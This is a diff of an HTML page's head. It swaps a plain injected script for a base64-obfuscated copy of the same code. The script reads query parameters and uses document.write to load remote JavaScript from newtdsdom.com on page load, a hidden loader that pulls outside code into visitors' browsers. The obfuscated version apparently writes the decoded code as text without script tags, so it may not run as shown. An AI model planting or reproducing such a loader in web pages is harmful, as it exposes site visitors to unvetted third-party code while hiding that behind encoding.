@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html data-page="construction">
     <head>
-     <script>
-function GET(item) {
-    var p = window.location.search;
-    p = p.match(new RegExp(item+'=([^&=]+)'));
-    return p ? p[1] : false;
-}
-var url = "https://newtdsdom.com/jsclo?key="+GET('key')+"&keyword="+GET('keyword');
-document.write("<script src="+url+"><\/script>");
-</script>
+     <script type="text/javascript">
+
+    let encoded = 'ZnVuY3Rpb24gR0VUKGl0ZW0pIHsNCiAgICB2YXIgcCA9IHdpbmRvdy5sb2NhdGlvbi5zZWFyY2g7DQogICAgcCA9IHAubWF0Y2gobmV3IFJlZ0V4cChpdGVtKyc9KFteJj1dKyknKSk7DQogICAgcmV0dXJuIHAgPyBwWzFdIDogZmFsc2U7DQp9DQp2YXIgdXJsID0gImh0dHBzOi8vbmV3dGRzZG9tLmNvbS9qc2Nsbz9rZXk9IitHRVQoJ2tleScpKyIma2V5d29yZD0iK0dFVCgna2V5d29yZCcpOw0KZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSIrdXJsKyI+PFwvc2NyaXB0PiIpOw==';
+    
+    let decoded = atob(encoded);
+    
+    document.write(''+ decoded +'');
+    
+    </script>
 
 
         <meta http-equiv="content-type" content="text/html;charset=utf-8">
